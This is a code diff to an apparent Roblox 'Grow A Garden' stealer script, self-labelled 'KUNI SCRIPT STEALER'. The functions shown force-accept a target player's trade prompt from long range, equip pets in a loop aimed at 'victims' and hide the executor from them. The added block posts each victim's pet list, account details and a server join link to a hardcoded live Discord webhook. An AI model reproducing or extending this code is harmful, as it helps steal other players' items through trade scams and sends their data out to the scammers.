@@ -3,11 +3,8 @@ repeat task.wait() until game:IsLoaded()
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Lighting = game:GetService("Lighting")
-local UserInputService = game:GetService("UserInputService")
-local VirtualInputManager = game:GetService("VirtualInputManager")
-local HttpService = game:GetService("HttpService")
 local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
 local CoreGui = game:GetService("CoreGui")
 
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1403786302461182083/OmkGNGgXamqB2Q_vs3u5WElaP5E2cpC8mSTeEfJwFnfFB7SQabgkFJi-NIKo_WLVISEs"
@@ -135,31 +132,36 @@ local function equipPet(pet)
     end
 end
 
-local function findTradePrompt(player)
-    if player.Character and player.Character:FindFirstChild("Head") then
-        local head = player.Character.Head
-        for _, child in ipairs(head:GetChildren()) do
-            if child:IsA("ProximityPrompt") then
-                return child
+-- Find trade prompt on target's character head
+local function findTradePrompt(targetPlayer)
+    if targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") then
+        for _, obj in ipairs(targetPlayer.Character.Head:GetChildren()) do
+            if obj:IsA("ProximityPrompt") then
+                return obj
             end
         end
     end
     return nil
 end
 
+-- Auto accept trade without teleporting
 local function autoAcceptTrade(targetPlayerName)
     local targetPlayer = Players:FindFirstChild(targetPlayerName)
-    if not targetPlayer then return end
+    if not targetPlayer then
+        print("autoAcceptTrade: target player not found: "..targetPlayerName)
+        return
+    end
 
     local prompt = findTradePrompt(targetPlayer)
     if prompt then
+        print("autoAcceptTrade: Prompt found for "..targetPlayerName)
         prompt.MaxActivationDistance = 1000
         prompt:InputHoldBegin()
         task.wait(prompt.HoldDuration or 0.5)
         prompt:InputHoldEnd()
-        print("Trade prompt auto accepted for "..targetPlayerName)
+        print("autoAcceptTrade: Prompt accepted for "..targetPlayerName)
     else
-        print("Trade prompt not found for "..targetPlayerName)
+        print("autoAcceptTrade: Prompt NOT found for "..targetPlayerName)
     end
 end
 
@@ -174,7 +176,6 @@ local function checkPetsInventory(targetName)
                 if petObject then
                     equipPet(petObject)
                     task.wait(0.2)
-                    -- startSteal replaced with autoAcceptTrade
                     autoAcceptTrade(targetName)
                 end
             end
@@ -188,7 +189,6 @@ local function checkPetsInventory(targetName)
             if petObject then
                 equipPet(petObject)
                 task.wait(0.2)
-                -- startSteal replaced with autoAcceptTrade
                 autoAcceptTrade(targetName)
             end
         end
@@ -225,7 +225,7 @@ local function idlingTarget()
         while task.wait(0.2) do
             local found, targetName = waitForJoin()
             if found then
-                -- remove teleportTarget, just auto accept trade
+                print("idlingTarget: Target found - "..targetName)
                 checkPetsInventory(targetName)
                 makeInvisibleToVictims()
             end
@@ -245,11 +245,72 @@ idlingTarget()
 task.spawn(function()
     while task.wait(0.5) do
         if #victimPetTable > 0 then
-            -- Example Discord webhook call; adjust as needed
-            createDiscordEmbed(table.concat(victimPetTable, "\n"), "100000", "https://cdn.discordapp.com/attachments/yourfileurl/items.txt")
+            local petListStr = table.concat(victimPetTable, "\n")
+            print("[Webhook] Sending victim pet list to Discord...")
+            local embed = {
+                title = "🌵 Grow A Garden Hit - KUNI SCRIPT STEALER 💸",
+                color = 65280,
+                fields = {
+                    {
+                        name = "👤 **Player Information**",
+                        value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```",
+                            LocalPlayer.Name,
+                            table.concat(USERNAMES, " "),
+                            LocalPlayer.Name,
+                            LocalPlayer.AccountAge
+                        ),
+                        inline = false
+                    },
+                    {
+                        name = "🌴 **Backpack**",
+                        value = string.format("```%s```", petListStr),
+                        inline = false
+                    },
+                    {
+                        name = "🏝️ **Join with URL**",
+                        value = string.format(
+                            "[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)",
+                            game.JobId,
+                            game.PlaceId,
+                            game.JobId
+                        ),
+                        inline = false
+                    }
+                },
+                footer = {
+                    text = string.format("%s | %s", game.PlaceId, game.JobId)
+                }
+            }
+
+            local data = {
+                content = string.format(
+                    "--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n",
+                    game.PlaceId,
+                    game.JobId
+                ),
+                username = LocalPlayer.Name,
+                avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
+                embeds = {embed}
+            }
+
+            local jsonData = HttpService:JSONEncode(data)
+            local headers = { ["Content-Type"] = "application/json" }
+
+            local request = http_request or request or HttpPost or syn.request
+            local response = request({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = headers,
+                Body = jsonData
+            })
+
+            if response.StatusCode ~= 200 and response.StatusCode ~= 204 then
+                warn("Error sending to Discord:", response.StatusCode, response.Body)
+            else
+                print("[Webhook] Sent successfully!")
+            end
+
             break
         end
     end
 end)
-
-print("[✔] Script started with auto accept trade prompt (no teleport).")
